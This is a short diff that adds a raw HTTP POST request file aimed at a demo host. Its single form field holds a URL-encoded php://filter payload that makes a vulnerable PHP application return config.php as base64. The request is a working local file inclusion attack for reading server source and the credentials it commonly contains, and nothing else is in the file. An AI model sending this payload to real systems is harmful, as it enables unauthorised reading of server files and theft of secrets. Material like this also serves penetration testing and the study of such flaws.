@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 78
+Connection: close
+
+page=php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dconfig.php
